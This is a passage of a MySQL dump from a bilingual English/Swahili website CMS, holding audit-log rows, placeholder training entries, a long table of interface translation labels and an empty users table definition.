(4, 1, 'Photo', 'update', '127.0.0.1', 'http://127.0.0.1:8000/cms/media/22', '{\"id\":22,\"title_en\":\"Consectetur adipisicing consectetur adipisicing consectetur adipisicing\",\"title_sw\":\"Consectetur adipisicing consectetur adipisicing consectetur adipisicing\",\"content_en\":\"\",\"content_sw\":\"\",\"mime\":\"\",\"path\":\"\",\"url\":\"https:\\/\\/www.youtube.com\\/watch?v=vHonWT6849A\",\"filename\":\"\",\"iconurl\":\"\",\"slug\":\"management-team\",\"user_id\":0,\"gallery_id\":4,\"status\":1,\"created_at\":\"2021-08-04T06:28:45.000000Z\",\"updated_at\":\"2022-08-26T06:37:30.000000Z\"}', '2022-10-19 01:13:05', '2022-10-19 01:13:05'),
(5, 1, 'Photo', 'update', '127.0.0.1', 'http://127.0.0.1:8000/cms/media/20', '{\"id\":20,\"title_en\":\"Veritatis obcaecati tenetur iure eius earum ut molestias\",\"title_sw\":\"Veritatis obcaecati tenetur iure eius earum ut molestias\",\"content_en\":\"\",\"content_sw\":\"\",\"mime\":\"\",\"path\":\"\",\"url\":\"https:\\/\\/www.youtube.com\\/watch?v=wHWbZmg2hzU\",\"filename\":\"\",\"iconurl\":\"\",\"slug\":\"good-music\",\"user_id\":0,\"gallery_id\":4,\"status\":1,\"created_at\":\"2021-08-04T06:27:44.000000Z\",\"updated_at\":\"2022-08-13T20:52:02.000000Z\"}', '2022-10-19 01:13:57', '2022-10-19 01:13:57'),
(6, 1, 'Photo', 'update', '127.0.0.1', 'http://127.0.0.1:8000/cms/media/21', '{\"id\":21,\"title_en\":\"Possimus quis earum veniam  quasi aliquam eligendi, placeat qui corporis!\",\"title_sw\":\"Possimus quis earum veniam  quasi aliquam eligendi, placeat qui corporis!\",\"content_en\":\"\",\"content_sw\":\"\",\"mime\":\"\",\"path\":\"\",\"url\":\"https:\\/\\/www.youtube.com\\/watch?v=wLLAWiOfukk\",\"filename\":\"\",\"iconurl\":\"\",\"slug\":\"real-possibilities-on-enhancement-of-the-achievable-estimates\",\"user_id\":0,\"gallery_id\":4,\"status\":1,\"created_at\":\"2021-08-04T06:28:21.000000Z\",\"updated_at\":\"2022-08-13T21:00:05.000000Z\"}', '2022-10-19 01:15:23', '2022-10-19 01:15:23'),
(7, 1, 'Photo', 'update', '127.0.0.1', 'http://127.0.0.1:8000/cms/media/19', '{\"id\":19,\"title_en\":\"Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus\",\"title_sw\":\"Voluptatem quaerat non architecto ab laudantium modi minima sunt esse temporibus\",\"content_en\":\"\",\"content_sw\":\"\",\"mime\":\"\",\"path\":\"\",\"url\":\"https:\\/\\/www.youtube.com\\/watch?v=xP76q3quHb0\",\"filename\":\"\",\"iconurl\":\"\",\"slug\":\"good-video-very-very-nice\",\"user_id\":0,\"gallery_id\":4,\"status\":1,\"created_at\":\"2021-08-04T06:27:11.000000Z\",\"updated_at\":\"2022-08-13T21:46:28.000000Z\"}', '2022-10-19 01:16:54', '2022-10-19 01:16:54');

-- --------------------------------------------------------

--
-- Table structure for table `trainings`
--

CREATE TABLE `trainings` (
  `id` int(10) UNSIGNED NOT NULL,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `content_sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_en` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `file_sw` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `location` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `start_date` date DEFAULT NULL,
  `end_date` date DEFAULT NULL,
  `active` tinyint(1) NOT NULL DEFAULT 1,
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `trainings`
--

INSERT INTO `trainings` (`id`, `title_sw`, `title_en`, `content_sw`, `content_en`, `file_en`, `file_sw`, `location`, `start_date`, `end_date`, `active`, `slug`, `created_at`, `updated_at`) VALUES
(1, 'Mafunzo wa kiwango cha juu zaidi', 'Highly sophisticated specialist training', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>', '/uploads/trainings/en1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1) (1).doc', '/uploads/trainings/sw1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1).doc', 'Nkrumah Hall', '2022-07-04', '2022-07-06', 1, 'highly-sophisticated-specialist-training', '2022-06-30 21:10:57', '2022-06-30 21:10:57'),
(2, 'kiwango cha juu zaidi Mafunzo wa pili', 'specialist training in Highly sophisticated ', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>', '<p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Maxime mollitia, molestiae quas vel sint commodi repudiandae consequuntur voluptatum laborum numquam blanditiis harum quisquam eius sed odit fugiat iusto fuga praesentium optio, eaque rerum! Provident similique accusantium nemo autem. Veritatis obcaecati tenetur iure eius earum ut molestias architecto voluptate aliquam nihil, eveniet aliquid culpa officia aut! Impedit sit sunt quaerat, odit, tenetur error, harum nesciunt ipsum debitis quas aliquid. Reprehenderit</p>', '/uploads/trainings/en1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1) (1).doc', '/uploads/trainings/sw1656634257-en-1656615989-en-1656615890-en-1656615782-SKILLS FOR  JOB (1).doc', 'Nkrumah Hall', '2022-07-04', '2022-07-06', 1, 'highly-sophisticated-specialist-training', '2022-06-30 21:10:57', '2022-06-30 21:10:57');

-- --------------------------------------------------------

--
-- Table structure for table `translations`
--

CREATE TABLE `translations` (
  `id` int(10) UNSIGNED NOT NULL,
  `keyword` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `en` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `sw` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `translations`
--

INSERT INTO `translations` (`id`, `keyword`, `en`, `sw`, `created_at`, `updated_at`) VALUES
(1, 'lbl_site_title', 'Swahili Coders', 'Swahili Coders', '2020-04-17 06:41:00', '2022-10-16 08:05:33'),
(2, 'lbl_site_subtitle', 'The United Republic of Tanzania', 'Jamhuri ya Muungano wa Tanzania', '2020-04-17 06:41:00', '2022-08-14 02:40:41'),
(3, 'lbl_feedback', 'Feedback, Complaint or Opinion', 'Mrejesho, Malalamiko au Wazo', '2020-04-17 06:41:00', '2022-03-10 09:27:54'),
(4, 'lbl_contact', 'Contact Us', 'Wasiliana Nasi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(5, 'lbl_region', 'Region', 'Mkoa', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(11, 'lbl_region_offices', 'HST Offices', 'Ofisi za HST', '2020-04-17 06:41:00', '2022-07-17 03:52:29'),
(12, 'lbl_social', 'Social Media', 'Mitandao ya Kijamii', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(13, 'lbl_faq', 'Frequently Asked Questions', 'Maswali Yaulizwayo Mara kwa Mara', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(14, 'lbl_faq_short', 'FAQs', 'MMM', '2020-04-17 06:41:00', '2021-09-21 15:22:22'),
(16, 'lbl_our_services', 'Our Services', 'Huduma Zetu', '2020-04-17 06:41:00', '2022-06-24 16:36:54'),
(17, 'lbl_sitemap', 'Sitemap', 'Ramani Ya Tovuti', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(18, 'lbl_languge', 'English', 'Kiswahili', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(20, 'lbl_profile', 'Profile', 'Wasifu', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(22, 'lbl_announcements', 'Announcements', 'Matangazo', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(24, 'lbl_recent_press', 'Press releases', 'Taarifa kwa vyombo vya habari', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(27, 'lbl_latest_news', 'Latest News', 'Habari Mpya', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(28, 'lbl_latest_products', 'Latest Products', 'Bidhaa Mpya', '2020-04-17 06:41:00', '2022-01-10 01:14:43'),
(29, 'lbl_latest_publications', 'Latest Publications', 'Machapisho Mapya', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(30, 'lbl_news', 'News', 'Habari', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(32, 'lbl_events', 'Events', 'Matukio', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(33, 'lbl_document', 'Document', 'Document', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(34, 'lbl_more', 'More', 'Zaidi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(35, 'lbl_more_news', 'More News', 'Habari Zaidi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(36, 'lbl_more_events', 'More Events', 'Matukio Zaidi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(37, 'lbl_more_gallery', 'More Gallery', 'Maktaba zote', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(38, 'lbl_more_products', 'More Products', 'Bidhaa Zaidi', '2020-04-17 06:41:00', '2022-01-10 01:14:43'),
(39, 'lbl_more_publications', 'More publications', 'More publications', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(40, 'lbl_more_announcements', 'View All Announcements', 'Matangazo Zaidi', '2020-04-17 06:41:00', '2020-08-05 01:43:45'),
(42, 'lbl_related_links', 'Related Links', 'Tovuti Mashuhuri', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(43, 'lbl_e_services_links', 'E-Services', 'Huduma Mtandao', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(44, 'lbl_quick_links', 'Quick Links', 'Kurasa za Karibu', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(45, 'lbl_readmore', 'Read More', 'Soma zaidi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(46, 'lbl_view_all_news', 'View All News', 'Soma Habari zaidi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(50, 'lbl_home', 'Home', 'Mwanzo', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(51, 'lbl_category', 'Category', 'Makundi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(53, 'lbl_pages', 'Pages', 'Kurasa', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(54, 'lbl_speeches', 'Speeches', 'Hotuba', '2020-04-17 06:41:00', '2021-09-26 07:39:04'),
(56, 'lbl_how_doi', 'How Do I?', 'Nifanyaje?', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(58, 'lbl_about_us', 'About us', 'Kuhusu sisi', '2020-04-17 06:41:00', '2021-10-04 07:20:28'),
(59, 'lbl_products', 'Products', 'Bidhaa', '2020-04-17 06:41:00', '2020-06-23 06:30:47'),
(60, 'lbl_publications', 'Publications', 'Machapisho', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(61, 'lbl_no_information', 'Content not found ', 'Hakuna Taarifa kwa sasa ', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(66, 'lbl_album', 'Albums', 'Albamu', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(67, 'lbl_vids', 'Videos', 'Video', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(68, 'lbl_error', 'Content Not Found', 'Taarifa hazijapatikana', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(73, 'lbl_desc', 'Description', 'Maelezo', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(79, 'lbl_press', 'Press Release', 'Vyombo vya Habari', '2020-04-17 06:41:00', '2021-10-17 16:06:16'),
(80, 'lbl_posted', 'Posted On', 'Imewekwa', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(82, 'lbl_biography', 'Biography', 'Wasifu', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(84, 'lbl_address', 'Postal Address', 'Anwani/Mahali', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(86, 'lbl_more_videos', 'More Videos', 'Video Zaidi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(87, 'lbl_copyright', 'All Rights Reserved.', 'Haki zote zimehifadhiwa.', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(88, 'lbl_copyright_statement', 'Copy Right Statements.', 'Copy Right Statements.', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(93, 'lbl_download', 'Download', 'Pakua', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(94, 'lbl_print', 'Chapisha', 'Chapisha', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(96, 'lbl_sponsor', 'Sponsors', 'Wadhamini', '2020-04-17 06:41:00', '2021-06-17 10:41:12'),
(97, 'lbl_ega', 'e-Government Authority', 'Mamlaka ya Serikali Mtandao', '2020-04-17 06:41:00', '2021-06-13 06:19:37'),
(98, 'lbl_designed', 'The website is Designed, Developed And Maintained by', 'Imesanifiwa na Imetengenezwa na', '2020-04-17 06:41:00', '2021-11-23 09:50:46'),
(99, 'lbl_content_maintained ', 'Content Maintained by Swahili Coders', 'Huendeshwa na Swahili Coders', '2020-04-17 06:41:00', '2022-10-16 08:05:33'),
(100, 'lbl_site_title_short ', 'SWAHILI CODERS', 'SWAHILI CODERS', '2020-04-17 06:41:00', '2022-10-15 12:38:32'),
(101, 'lbl_photo_gallery', 'Photo Gallery', 'Maktaba ya Picha', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(102, 'lbl_video_gallery', 'Video Gallery', 'Maktaba ya Video', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(103, 'lbl_audio_gallery', 'Audio Gallery', 'Maktaba ya Audio', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(105, 'lbl_media_center', 'Media Center', 'Ukumbi wa Habari', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(106, 'lbl_name', 'Name', 'Jina', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(107, 'lbl_email', 'Email Address', 'Barua pepe', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(108, 'lbl_phone', 'Phone', 'Simu', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(109, 'lbl_phone_number', 'Phone Number', 'Namba ya Simu', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(110, 'lbl_fax', 'Fax', 'Nukushi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(111, 'lbl_message', 'Message', 'Ujumbe', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(112, 'lbl_send', 'Send', 'Tuma', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(114, 'lbl_search', 'Search', 'Tafuta', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(115, 'lbl_search_results', 'Search Results', 'Matokeo', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(116, 'lbl_search1', 'Type your search here then press ENTER', 'Andika Unachokitafuta Hapa Kisha bonyeza kitufe', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(117, 'lbl_mobile', 'Mobile', 'Simu ya Mkononi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(118, 'lbl_telephone', 'Telephone', 'Simu', '2020-04-17 06:41:00', '2022-02-16 07:53:26'),
(119, 'lbl_p.o.box', 'P.O Box', 'S.L.P', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(120, 'lbl_comments', 'Comments', 'Maoni', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(124, 'stakeholders', 'Stakeholders', 'Wadau', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(125, 'privacy_policy', 'Privacy Policy', 'Sera ya Faragha', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(126, 'disclaimer', 'Disclaimer', 'Angalizo', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(133, 'lbl_videos_gallery', 'Video Albums', 'Albamu ya Video', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(134, 'lbl_vacancies', 'Vacancies', 'Ajira', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(135, 'lbl_deadline', 'Deadline', 'Tarehe ya Mwisho', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(138, 'lbl_welcome_note', 'Welcome', 'Karibu', '2020-04-17 06:41:00', '2020-06-27 07:34:01'),
(139, 'lbl_contact_info', 'Contact Info', 'Mawasiliano', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(141, 'lbl_view_more', 'View More', 'Angalia Zaidi', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(142, 'lbl_fullname', 'Fullname', 'Jina Kamili', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(143, 'lbl_subject', 'Subject', 'Kichwa cha Habari', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(144, 'lbl_call_us', 'Call us any time\n', 'Tupigie muda wowote', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(145, 'lbl_hotline', 'Hotline', 'Hotline', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(146, 'lbl_view', 'View', 'Tazama', '2020-04-17 06:41:00', '2021-07-09 12:27:59'),
(148, 'lbl_contacts', 'Contacts Us', 'Wasiliana Nasi', '2020-04-17 06:41:00', '2021-06-28 12:02:48'),
(173, 'lbl_projects', 'Our Projects', 'Miradi Yetu', '2020-04-17 06:41:00', '2021-10-14 03:32:40'),
(181, 'lbl_submit', 'Submit', 'Wasilisha', '2020-04-17 06:41:00', '2021-06-28 12:11:34'),
(247, 'lbl_sponsors_links', 'Sponsor Links', 'Wadhamini', '2020-06-23 04:28:17', '2020-06-23 04:28:17'),
(248, 'lbl_our_services_msg', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor\" elit, sed do eiusmod tempor,o eiusmod tempor\" Lorem ipsum dolor sit amet, consectetur adipiscing', 'Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor,o eiusmod tempor\" elit, sed do eiusmod tempor,o eiusmod tempor\" Lorem ipsum dolor sit amet, consectetur adipiscing', '2020-06-23 06:14:51', '2021-10-25 10:00:34'),
(249, 'lbl_our_products', 'Our Products', 'Bidhaa Zetu', '2020-06-23 06:30:22', '2022-01-10 01:14:43'),
(259, 'lbl_view_all', 'View All', 'Tazama Zaidi', '2021-06-13 05:58:35', '2021-06-13 05:58:35'),
(260, 'lbl_date', 'Date', 'Tarehe', '2021-06-16 09:21:35', '2021-06-16 09:21:35'),
(261, 'lbl_doc_title', 'Description', 'Maelezo', '2021-06-16 09:21:35', '2021-06-16 09:21:35'),
(267, 'lbl_duration', 'Duration', 'Muda', '2021-06-26 12:15:55', '2021-06-26 12:15:55'),
(269, 'lbL_feedback_success', 'Feedback Successful Submitted', 'Mrejesho / Maoni Yamewasilishwa', '2021-06-29 07:58:58', '2022-03-10 09:27:54'),
(273, 'lbl_latest_updates', 'Lastest Updates', 'Habari Mpya', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(277, 'lbl_overview', 'Overview', 'Muhtasari', '2021-07-09 15:54:12', '2021-07-09 15:54:12'),
(280, 'lbl_important_links', 'Important Links', 'Tovuti Muhimu', '2021-08-06 11:37:55', '2021-08-06 11:37:55'),
(281, 'lbl_site_sub_subtitle', 'Swahili Coders', 'Swahili Coders', '2021-08-06 11:37:55', '2022-10-16 08:05:33'),
(283, 'lbl_administration', 'Administration', 'Utawala', '2021-08-06 11:37:55', '2021-08-06 11:37:55'),
(289, 'lbl_feedbacks', 'Feedbacks', 'Mrejesho', '2021-08-06 11:37:55', '2022-03-11 03:51:00'),
(290, 'lbl_organization', 'Organization', 'Taasisi', '2021-08-06 11:37:55', '2021-08-06 11:37:55'),
(291, 'lbl_location', 'Location', 'Eneo / Mahali', '2021-08-06 11:37:55', '2021-10-29 07:02:51'),
(292, 'lbl_latest_announcement', 'Latest Announcements', 'Matangazo Mapya', '2021-08-06 11:49:39', '2021-08-06 11:49:39'),
(299, 'lbl_view_offices', 'View All Offices', 'Tazama Ofisi Zote', '2021-09-20 07:05:01', '2021-09-20 07:05:01'),
(300, 'lbl_not_found', 'Not Found', 'Haipatikani', '2021-09-21 06:56:31', '2021-09-21 06:56:31'),
(301, 'lbl_resource_not_found', 'Sorry, The Resource you are looking for was not found.', 'Samahani, Rasilimali uliyotafuta haikupatikana.', '2021-09-21 06:58:12', '2021-10-06 09:30:47'),
(312, 'lbl_toll_free', 'Toll Free', 'Piga Bure', '2021-10-13 13:24:52', '2022-01-09 11:29:37'),
(313, 'lbl_online_services', 'Online Services', 'Huduma Mtandao', '2021-10-14 07:49:03', '2021-10-14 07:49:03'),
(314, 'lbl_support', 'HST', 'HST', '2021-10-28 11:10:47', '2022-07-17 03:52:29'),
(315, 'lbl_site_motto', 'Adequate And Equitable Compensations', 'Adequate And Equitable Compensations', '2021-10-29 10:00:46', '2022-06-14 03:06:15'),
(330, 'lbl_archive', 'Archive', 'Hifadhi', '2021-11-23 14:03:17', '2022-03-07 09:40:15'),
(331, 'lbl_core_services', 'Core Services', 'Huduma za Msingi', '2021-11-23 14:03:17', '2022-01-09 11:38:24'),
(332, 'lbl_whistle_blower', 'Whistle Blower', 'Toa Taarifa', '2022-01-09 14:40:46', '2022-01-09 11:42:44'),
(333, 'lbl_optional', 'Optional', 'Hiari', '2022-03-10 13:15:51', '2022-03-10 13:15:51'),
(334, 'lbl_whistle_blower_success', 'Thank you, Whistle blow successful submitted', 'Asante, Taarifa imewasilisha', '2022-03-10 13:16:18', '2022-03-10 10:22:24'),
(335, 'lbl_incident_location', 'Where the Incident happened?', 'Tukio limetokea wapi?', '2022-03-10 13:16:46', '2022-03-10 10:22:24'),
(336, 'lbl_incident_description', 'Description of the incident', 'Maelezo ya Tukio', '2022-03-10 13:17:06', '2022-03-10 10:22:24'),
(337, 'lbl_incident_extra_info', 'Where to get further/extra information?', 'Wapi pakupata taarifa zaidi?', '2022-03-10 13:17:23', '2022-03-10 10:22:24'),
(338, 'lbl_attachment_proof', 'Upload proof attachment [PDF, PNG, JPG and not more than 1MB]', 'Ambatisha ushahidi [PDF, PNG, JPG na si zaidi ya 1MB]', '2022-03-10 13:42:30', '2022-03-10 10:46:41'),
(339, 'lbl_whistle_blower_fail', 'Failed to send email. Please try again.', 'Imeshindwa kutuma barua pepe. Tafadhali jaribu tena.', '2022-03-10 14:33:51', '2022-03-10 11:34:55'),
(340, 'lbl_campaign', 'Campaign', 'Kampeni', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(341, 'lbl_news_and_events', 'News & Events', 'Habari na Matukio', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(342, 'lbl_quotes', 'Quotes', 'Nukuu', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(343, 'lbl_our_campaigns', 'Campaigns', 'Kampeni', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(344, 'lbl_menu', 'Menu', 'Menu', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(345, 'lbl_details', 'Details', 'Maelezo', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(346, 'lbl_campaigns', 'Campaigns', 'Kampeni', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(347, 'lbl_hospitals', 'Hospitals', 'Hospitali', '2020-04-17 06:41:00', '2022-06-14 03:23:27'),
(348, 'lbl_training', 'Training', 'Mafunzo', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(349, 'lbl_comments_complaints_and_advise\r\n', 'Comments, Complaints and Advise', 'Maoni, Malalamiko na Ushauri', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(350, 'lbl_achievements', 'Achievements', 'Mafanikio', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(351, 'lbl_comments_complaints_and_advise', 'Comments Complaints and Advise', 'Maoni Malamiko na Ushauri', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(352, 'lbl_guidelines', 'Guidelines', 'Miongozo', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(353, 'lbl_operators', 'Operators', 'Operators', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(354, 'lbl_colateral_managers', 'Colateral Managers', 'Colateral Managers', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(355, 'lbl_warehouses', 'Warehouses', 'Maghala', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(356, 'lbl_price', 'Price', 'Bei', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(357, 'lbl_product', 'Product', 'Bidhaa', '2020-04-17 06:41:00', '2022-06-24 16:36:54'),
(358, 'lbl_category', 'Category', 'Aina', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(359, 'lbl_trainings', 'Training', 'Mafunzo', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(360, 'lbl_no_records_found', 'No any Matching Records', 'Hakuna matokea', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(361, 'lbl_clear_search', 'Clear Search', 'Anza Upya', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(362, 'lbl_attachment', 'Attachment', 'Kiambatanisho', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(363, 'lbl_latest_documents', 'Latest Documents', 'Machapisho Mapya', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(364, 'lbl_partners', 'Partners', 'Wadhamini', '2020-04-17 06:41:00', '2022-06-26 14:00:51'),
(365, 'lbl_support_links', 'Support Links', 'Support Links', '2020-04-17 06:41:00', '2022-08-06 11:25:37'),
(366, 'lbl_advertisements', 'Advertisements', 'Matangazo', '2020-04-17 06:41:00', '2022-08-06 11:25:37'),
(367, 'lbl_registration_documents', 'Registration Documents', 'Nyaraka za Usajili', '2020-04-17 06:41:00', '2022-08-06 11:25:37'),
(368, 'lbl_documents_center', 'Documents Center', 'Kituo cha Nyaraka', '2020-04-17 06:41:00', '2022-08-06 11:25:37'),
(369, 'lbl_document_center', 'Documents Center', 'Kituo cha Nyaraka', '2020-04-17 06:41:00', '2022-08-06 11:25:37'),
(370, 'lbl_licensed_entities', 'Licensed Entities', 'Licensed Entities', '2020-04-17 06:41:00', '2022-08-06 11:25:37'),
(371, 'lbl_dg_message', 'Commissioner\'s Message', 'Commissioner\'s Message', '2020-04-17 06:41:00', '2022-08-09 15:49:28'),
(373, 'lbl_documents_center', 'Documents Center', 'Documents Center', '2020-04-17 06:41:00', '2022-08-06 11:25:37'),
(374, 'lbl_more_info', 'More Informations', 'More Informations', '2020-04-17 06:41:00', '2020-04-17 06:41:00'),
(375, 'lbl_licensing_requirements', 'Licensing Requirements', 'Licensing Requirements', '2020-04-17 06:41:00', '2022-08-14 02:43:13'),
(376, 'lbl_members', 'Members', 'Wadau', '2020-04-17 06:41:00', '2022-08-14 02:43:13'),
(377, 'lbl_community', 'Community', 'Jamii', '2020-04-17 06:41:00', '2022-08-14 02:43:13');

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_login` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `photo` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `expiring_date` date NOT NULL,
  `remember_token` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

